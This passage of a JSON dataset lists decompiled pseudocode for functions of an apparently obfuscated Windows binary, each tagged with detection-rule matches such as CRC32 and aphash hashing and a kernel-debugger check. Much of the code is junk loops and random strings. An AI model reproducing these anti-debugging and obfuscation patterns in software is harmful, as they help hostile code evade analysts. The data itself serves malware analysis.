        "decompiled_code": "\nuint32_t __cdecl fcn.004053b2(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint arg_8h_00;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t arg_8h_01;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = (in_FPUControlWord & 1) << 4;\n    if ((in_FPUControlWord & 4) != 0) {\n        uVar3 = uVar3 | 8;\n    }\n    if ((in_FPUControlWord & 8) != 0) {\n        uVar3 = uVar3 | 4;\n    }\n    if ((in_FPUControlWord & 0x10) != 0) {\n        uVar3 = uVar3 | 2;\n    }\n    if ((in_FPUControlWord & 0x20) != 0) {\n        uVar3 = uVar3 | 1;\n    }\n    if ((in_FPUControlWord & 2) != 0) {\n        uVar3 = uVar3 | 0x80000;\n    }\n    uVar1 = in_FPUControlWord & 0xc00;\n    if ((in_FPUControlWord & 0xc00) != 0) {\n        if (uVar1 == 0x400) {\n            uVar3 = uVar3 | 0x100;\n        }\n        else if (uVar1 == 0x800) {\n            uVar3 = uVar3 | 0x200;\n        }\n        else if (uVar1 == 0xc00) {\n            uVar3 = uVar3 | 0x300;\n        }\n    }\n    if ((in_FPUControlWord & 0x300) == 0) {\n        uVar3 = uVar3 | 0x20000;\n    }\n    else if ((in_FPUControlWord & 0x300) == 0x200) {\n        uVar3 = uVar3 | 0x10000;\n    }\n    if ((in_FPUControlWord & 0x1000) != 0) {\n        uVar3 = uVar3 | 0x40000;\n    }\n    arg_8h_01 = ~arg_ch & uVar3 | arg_8h & arg_ch;\n    if (arg_8h_01 != uVar3) {\n        uVar1 = fcn.004d02e7(arg_8h_01);\n        arg_8h_01 = (uVar1 & 1) << 4;\n        if ((uVar1 & 4) != 0) {\n            arg_8h_01 = arg_8h_01 | 8;\n        }\n        if ((uVar1 & 8) != 0) {\n            arg_8h_01 = arg_8h_01 | 4;\n        }\n        if ((uVar1 & 0x10) != 0) {\n            arg_8h_01 = arg_8h_01 | 2;\n        }\n        if ((uVar1 & 0x20) != 0) {\n            arg_8h_01 = arg_8h_01 | 1;\n        }\n        if ((uVar1 & 2) != 0) {\n            arg_8h_01 = arg_8h_01 | 0x80000;\n        }\n        uVar2 = uVar1 & 0xc00;\n        if ((uVar1 & 0xc00) != 0) {\n            if (uVar2 == 0x400) {\n                arg_8h_01 = arg_8h_01 | 0x100;\n            }\n            else if (uVar2 == 0x800) {\n                arg_8h_01 = arg_8h_01 | 0x200;\n            }\n            else if (uVar2 == 0xc00) {\n                arg_8h_01 = arg_8h_01 | 0x300;\n            }\n        }\n        if ((uVar1 & 0x300) == 0) {\n            arg_8h_01 = arg_8h_01 | 0x20000;\n        }\n        else if ((uVar1 & 0x300) == 0x200) {\n            arg_8h_01 = arg_8h_01 | 0x10000;\n        }\n        if ((uVar1 & 0x1000) != 0) {\n            arg_8h_01 = arg_8h_01 | 0x40000;\n        }\n    }\n    if (0 < *0x573c4c) {\n        uVar3 = in_MXCSR >> 3 & 0x10;\n        if ((in_MXCSR & 0x200) != 0) {\n            uVar3 = uVar3 | 8;\n        }\n        if ((in_MXCSR & 0x400) != 0) {\n            uVar3 = uVar3 | 4;\n        }\n        if ((in_MXCSR & 0x800) != 0) {\n            uVar3 = uVar3 | 2;\n        }\n        if ((in_MXCSR & 0x1000) != 0) {\n            uVar3 = uVar3 | 1;\n        }\n        if ((in_MXCSR & 0x100) != 0) {\n            uVar3 = uVar3 | 0x80000;\n        }\n        uVar4 = in_MXCSR & 0x6000;\n        if (uVar4 != 0) {\n            if (uVar4 == 0x2000) {\n                uVar3 = uVar3 | 0x100;\n            }\n            else if (uVar4 == 0x4000) {\n                uVar3 = uVar3 | 0x200;\n            }\n            else if (uVar4 == 0x6000) {\n                uVar3 = uVar3 | 0x300;\n            }\n        }\n        uVar4 = in_MXCSR & 0x8040;\n        if (uVar4 == 0x40) {\n            uVar3 = uVar3 | 0x2000000;\n        }\n        else if (uVar4 == 0x8000) {\n            uVar3 = uVar3 | 0x3000000;\n        }\n        else if (uVar4 == 0x8040) {\n            uVar3 = uVar3 | 0x1000000;\n        }\n        uVar4 = ~(arg_ch & 0x308031f) & uVar3 | arg_ch & 0x308031f & arg_8h;\n        if (uVar4 != uVar3) {\n            arg_8h_00 = fcn.004cfb71(uVar4);\n            fcn.00406717(arg_8h_00);\n            uVar3 = in_MXCSR >> 3 & 0x10;\n            if ((in_MXCSR & 0x200) != 0) {\n                uVar3 = uVar3 | 8;\n            }\n            if ((in_MXCSR & 0x400) != 0) {\n                uVar3 = uVar3 | 4;\n            }\n            if ((in_MXCSR & 0x800) != 0) {\n                uVar3 = uVar3 | 2;\n            }\n            if ((in_MXCSR & 0x1000) != 0) {\n                uVar3 = uVar3 | 1;\n            }\n            if ((in_MXCSR & 0x100) != 0) {\n                uVar3 = uVar3 | 0x80000;\n            }\n            uVar4 = in_MXCSR & 0x6000;\n            if (uVar4 != 0) {\n                if (uVar4 == 0x2000) {\n                    uVar3 = uVar3 | 0x100;\n                }\n                else if (uVar4 == 0x4000) {\n                    uVar3 = uVar3 | 0x200;\n                }\n                else if (uVar4 == 0x6000) {\n                    uVar3 = uVar3 | 0x300;\n                }\n            }\n            uVar4 = in_MXCSR & 0x8040;\n            if (uVar4 == 0x40) {\n                uVar3 = uVar3 | 0x2000000;\n            }\n            else if (uVar4 == 0x8000) {\n                uVar3 = uVar3 | 0x3000000;\n            }\n            else if (uVar4 == 0x8040) {\n                uVar3 = uVar3 | 0x1000000;\n            }\n        }\n        uVar4 = uVar3 ^ arg_8h_01;\n        arg_8h_01 = uVar3 | arg_8h_01;\n        if ((uVar4 & 0x8031f) != 0) {\n            arg_8h_01 = arg_8h_01 | 0x80000000;\n        }\n    }\n    return arg_8h_01;\n}\n",
        "token_count": 2091
    },
    "004053c6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl\nfcn.004053c6(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint noname_9, uint arg_30h, uint arg_34h)\n\n{\n    int32_t iStack64;\n    uint var_4h;\n    \n    for (iStack64 = 0x3b; 0 < iStack64; iStack64 = iStack64 + -1) {\n    }\n    fcn.00401e79(0x54b904);\n    return arg_8h;\n}\n",
        "token_count": 173
    },
    "0040542a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040542a(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    int32_t var_114h;\n    uint var_110h;\n    uint var_f8h;\n    int32_t var_e0h;\n    uint var_dch;\n    uint var_c4h;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_90h;\n    uint var_78h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uchar var_3dh;\n    uint var_3ch;\n    uchar var_21h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xfffffed0;\n    var_14h = 0x4500e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_21h = 1;\n    var_10h = 2;\n    fcn.00401e79(\"ihkymthlxtqldpqncvunvuhnlhszgdmhqafpyfsjolusnoqsysgaomgubaceidiugdieuar\");\n    var_3dh = 1;\n    var_10h = 3;\n    fcn.00401e79(\"qjomylkyrtvpduipwyo\");\n    var_5ch = 0xb7;\n    var_60h = 800;\n    var_10h = 4;\n    fcn.00401e79(\"thrhsxjwfguonqwxrvsekejgrbpxtoyhmfmvekyojbhfxgqpupys\");\n    var_10h = 5;\n    fcn.00401e79(\"thrhsxjwfguonqwxrvsekejgrbpxtoyhmfmvekyojbhfxgqpupys\");\n    var_10h = 8;\n    fcn.00401e79(\"thrhsxjwfguonqwxrvsekejgrbpxtoyhmfmvekyojbhfxgqpupys\");\n    uVar1 = fcn.00405b37(&var_a8h, &var_90h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_ach = 0x4f; 0 < var_ach; var_ach = var_ach + -1) {\n        }\n    }\n    var_10h = 5;\n    fcn.00401e79(\"qjomylkyrtvpduipwyo\");\n    var_10h = 7;\n    fcn.00401e79(\"qjomylkyrtvpduipwyo\");\n    uVar1 = fcn.004042dc(&var_dch, &var_c4h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_e0h = 0x39; 0 < var_e0h; var_e0h = var_e0h + -1) {\n        }\n    }\n    var_10h = 5;\n    fcn.00401e79(\"thrhsxjwfguonqwxrvsekejgrbpxtoyhmfmvekyojbhfxgqpupys\");\n    var_10h = 6;\n    fcn.00401e79(\"thrhsxjwfguonqwxrvsekejgrbpxtoyhmfmvekyojbhfxgqpupys\");\n    uVar1 = fcn.004042dc(&var_110h, &var_f8h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_114h = 0xe; 0 < var_114h; var_114h = var_114h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 1033
    },
    "00405489": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405489(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450ec0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 3;\n    fcn.00401e79(\"cgbcabpfzzysgoydsqybnsfllemoirkygoablofjmtwkiljvhwybkgfpahfdpnmugulawkdtzinaorupqozzggfljqgtibeergby\")\n    ;\n    uStack24 = 4;\n    fcn.00401e79(\"uaeotxrdditgpkhvjcmxkdkpk\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 272
    },
    "00405506": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl\nfcn.00405506(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint noname_6, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000002c;\n    int32_t iStack200;\n    int32_t iStack196;\n    uchar auStack192 [24];\n    uchar auStack168 [24];\n    int32_t iStack144;\n    uint uStack140;\n    ulong uStack136;\n    uint uStack124;\n    uchar uStack117;\n    uint uStack116;\n    uint8_t uStack81;\n    ulong uStack80;\n    uint8_t uStack65;\n    ulong uStack64;\n    uchar uStack49;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff20;\n    uStack48 = CONCAT44(in_stack_0000002c, arg_2ch);\n    uStack64 = CONCAT44(noname_6, arg_1ch);\n    uStack80 = CONCAT44(noname_3, arg_10h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4182d0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uVar2 = CONCAT11(arg_28h, arg_ch) & 0x1ff;\n    uStack49 = uVar2 >> 8;\n    uStack65 = arg_18h & 1;\n    uStack81 = uVar2 & 1;\n    fcn.00401e79(\"ribqlkesvpsuwgxra\");\n    uStack116 = 0x577;\n    uStack117 = 1;\n    uStack124 = 0x9b3;\n    uStack136 = *0x4ec398;\n    uStack140 = 0x5c0;\n    for (iStack144 = 0x2b; 0 < iStack144; iStack144 = iStack144 + -1) {\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"ribqlkesvpsuwgxra\");\n    uStack24 = 1;\n    fcn.00401e79(\"ribqlkesvpsuwgxra\");\n    uVar1 = fcn.004042dc(auStack192, auStack168);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack196 = 0x15; 0 < iStack196; iStack196 = iStack196 + -1) {\n        }\n    }\n    for (iStack200 = 0x27; 0 < iStack200; iStack200 = iStack200 + -1) {\n    }\n    uStack24 = 0;\n    fcn.00401e79(0x544a21);\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 760
    },
    "0040550b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0040550b(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x427040;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    uVar1 = fcn.00401fdc();\n    if (((uVar1 & 1) != 0) && (uVar2 = fcn.004017c1(),  (uVar2 & 2) != 0)) {\n        fcn.00404def();\n        iVar3 = fcn.00405367();\n        if (iVar3 == -1) {\n            fcn.004067a3(4, 0);\n        }\n    }\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 256
    },
    "00405515": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00405515(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_a1h;\n    uint var_9ch;\n    uint var_84h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_3ch;\n    uint var_24h;\n    uint8_t var_1dh;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff50;\n    var_10h = 0xffffffff;\n    var_14h = 0x450e00;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_1dh = arg_8h & 1;\n    fcn.00401e79(\"jsvuft\");\n    var_10h = 0;\n    fcn.00401e79(\"gkzra\");\n    var_58h = 0x5e1;\n    var_5ch = 0x24;\n    var_60h = 0x1bea;\n    for (var_64h = 0x3a; 0 < var_64h; var_64h = var_64h + -1) {\n    }\n    for (var_68h = 0x3a; 0 < var_68h; var_68h = var_68h + -1) {\n    }\n    for (var_6ch = 0xf; 0 < var_6ch; var_6ch = var_6ch + -1) {\n    }\n    var_10h = 1;\n    fcn.00401e79(\"jsvuft\");\n    var_10h = 2;\n    fcn.00401e79(\"jsvuft\");\n    uVar1 = fcn.00405b37(&var_9ch, &var_84h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (stack0xffffff5c = 7; 0 < stack0xffffff5c; *NULL = stack0xffffff5c + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return *0x547074;\n}\n",
        "token_count": 602
    },
    "0040559c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040559c(uint32_t arg_8h)\n\n{\n    int32_t iStack8;\n    \n    if ((arg_8h & 0x20) == 0) {\n        if ((arg_8h & 8) != 0) {\n            return 1;\n        }\n        if ((arg_8h & 4) == 0) {\n            if ((arg_8h & 1) == 0) {\n                return (arg_8h & 2) * 2;\n            }\n            iStack8 = 3;\n        }\n        else {\n            iStack8 = 2;\n        }\n    }\n    else {\n        iStack8 = 5;\n    }\n    return iStack8;\n}\n",
        "token_count": 166
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00405664": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405664(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint noname_4, uint arg_1ch)\n\n{\n    int32_t iStack56;\n    int32_t iStack52;\n    int32_t iStack48;\n    \n    for (iStack48 = 0xc; 0 < iStack48; iStack48 = iStack48 + -1) {\n    }\n    for (iStack52 = 0x3b; 0 < iStack52; iStack52 = iStack52 + -1) {\n    }\n    for (iStack56 = 0xb; 0 < iStack56; iStack56 = iStack56 + -1) {\n    }\n    return 1;\n}\n",
        "token_count": 174
    },
    "004056fa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004056fa(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_90h;\n    int32_t var_78h;\n    uint var_74h;\n    uint var_5ch;\n    int32_t var_44h;\n    uchar var_3eh;\n    uchar var_3dh;\n    uint var_3ch;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff38;\n    var_14h = 0x44fe40;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = 0x42f;\n    var_10h = 0;\n    fcn.00401e79(\"ujbvloerzogkugwknhwgwazozkahyzyuymrqcixsjdfjprjhcnzetjqxaaacnetd\");\n    var_3dh = 0;\n    var_3eh = 1;\n    for (var_44h = 0x60; 0 < var_44h; var_44h = var_44h + -1) {\n    }\n    var_10h = 1;\n    fcn.00401e79(\"ujbvloerzogkugwknhwgwazozkahyzyuymrqcixsjdfjprjhcnzetjqxaaacnetd\");\n    var_10h = 3;\n    fcn.00401e79(\"ujbvloerzogkugwknhwgwazozkahyzyuymrqcixsjdfjprjhcnzetjqxaaacnetd\");\n    uVar1 = fcn.00405b37(&var_74h, &var_5ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_78h = 0x3c; 0 < var_78h; var_78h = var_78h + -1) {\n        }\n    }\n    var_10h = 1;\n    fcn.00401e79(\"ujbvloerzogkugwknhwgwazozkahyzyuymrqcixsjdfjprjhcnzetjqxaaacnetd\");\n    var_10h = 2;\n    fcn.00401e79(\"ujbvloerzogkugwknhwgwazozkahyzyuymrqcixsjdfjprjhcnzetjqxaaacnetd\");\n    uVar1 = fcn.00405b37(&var_a8h, &var_90h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_ach = 0; 0 < var_ach; var_ach = var_ach + -1) {\n        }\n    }\n    var_10h = 1;\n    fcn.00401e79(\"tmqjoiquah\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 819
    },
    "004057f4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004057f4(uint arg_8h)\n\n{\n    int32_t iStack28;\n    \n    for (iStack28 = 1; 0 < iStack28; iStack28 = iStack28 + -1) {\n    }\n    return 0x125d2;\n}\n",
        "token_count": 68
    },
    "00405975": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00405975(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack216;\n    uchar auStack212 [24];\n    uchar auStack188 [123];\n    uchar uStack65;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff08;\n    uStack28 = 0x450d00;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x4062c000;\n    uStack48 = 0;\n    uStack52 = 0x40e5c760;\n    uStack56 = 0;\n    uStack60 = 0x40a8e600;\n    uStack64 = 0;\n    uStack65 = 1;\n    uStack24 = 2;\n    fcn.00401e79(\"lnontftgzbdysjzceluplaqgbygnptrpbzbnyrifemfaueiablnpuiylodstasfkqvjaabtjkse\");\n    uStack24 = 3;\n    fcn.00401e79(\"yyfxdftpwiaukjyqexdcramcvehwjhaepptmfeekqjioetbmfuubrskbdhrdgwsdqfkdhdhnefpbeyebe\");\n    uStack24 = 4;\n    fcn.00401e79(\"cyjiqvimkkwnzxmmbrwfwsbzabbsqjftxjqautckxrfmesgjjuhxjpuesetwsudhflmmozqazrvjgsuuqppq\");\n    uStack24 = 5;\n    fcn.00401e79(\"obiudfrdtslkeaziomrewspkintqcxvhjiqtvlzesauvelyjwubuoxf\");\n    uStack24 = 6;\n    fcn.00401e79(\"cyjiqvimkkwnzxmmbrwfwsbzabbsqjftxjqautckxrfmesgjjuhxjpuesetwsudhflmmozqazrvjgsuuqppq\");\n    uStack24 = 7;\n    fcn.00401e79(\"cyjiqvimkkwnzxmmbrwfwsbzabbsqjftxjqautckxrfmesgjjuhxjpuesetwsudhflmmozqazrvjgsuuqppq\");\n    uVar1 = fcn.004042dc(auStack212, auStack188);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack216 = 0x35; 0 < iStack216; iStack216 = iStack216 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 789
    },
    "00405998": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405998(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack148;\n    int32_t iStack144;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4501e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"ehidmameawrfsscramzhaswenmocqcascpmcvvzogdjumqszzfkup\");\n    uStack24 = 1;\n    fcn.00401e79(\"jyngleqqjaqdsapkpiclshapgvgkdortmnlitndfupmvjkvpdjrskxuphwhuabxnzzluuhkqppvmanvoapbhntlqddbgfeb\");\n    uStack24 = 2;\n    fcn.00401e79(\"gryywlbugxbrbfjzzktedxgcggtvmcbtvzcljwhxzffrwnxlsymrvzdylyldthiqursmtkutda\");\n    for (iStack144 = 0x11; 0 < iStack144; iStack144 = iStack144 + -1) {\n    }\n    for (iStack148 = 0x42; 0 < iStack148; iStack148 = iStack148 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 404
    },
    "00405a01": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a01(uint arg_8h, uint *arg_ch)\n\n{\n    uint32_t *puVar1;\n    \n    if ((arg_8h != '\\0') && (puVar1 = arg_ch + 3,  (*puVar1 >> 9 & 1) != 0)) {\n        fcn.004042b9(arg_ch);\n        LOCK();\n        *puVar1 = *puVar1 & 0xfffffd7f;\n        arg_ch[6] = 0;\n        arg_ch[1] = 0;\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "00405a1a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00405a1a(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack156;\n    uchar auStack152 [24];\n    uchar auStack128 [24];\n    int32_t iStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    ulong uStack88;\n    uchar uStack73;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff48;\n    uStack28 = 0x450060;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40b0f400;\n    uStack48 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"fgnowwzjijpzuraxkhngmsjffwwhwguymhgmxtcdvojmsiujzbmxshkidnwaydhxwawbmtxzcxleuredjoynsjncukrk\");\n    uStack73 = 0;\n    uStack88 = *0x546a18;\n    for (iStack92 = 0x62; 0 < iStack92; iStack92 = iStack92 + -1) {\n    }\n    for (iStack96 = 0x32; 0 < iStack96; iStack96 = iStack96 + -1) {\n    }\n    for (iStack100 = 0x30; 0 < iStack100; iStack100 = iStack100 + -1) {\n    }\n    for (iStack104 = 4; 0 < iStack104; iStack104 = iStack104 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"fgnowwzjijpzuraxkhngmsjffwwhwguymhgmxtcdvojmsiujzbmxshkidnwaydhxwawbmtxzcxleuredjoynsjncukrk\");\n    uStack24 = 3;\n    fcn.00401e79(\"fgnowwzjijpzuraxkhngmsjffwwhwguymhgmxtcdvojmsiujzbmxshkidnwaydhxwawbmtxzcxleuredjoynsjncukrk\");\n    uVar1 = fcn.004042dc(auStack152, auStack128);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 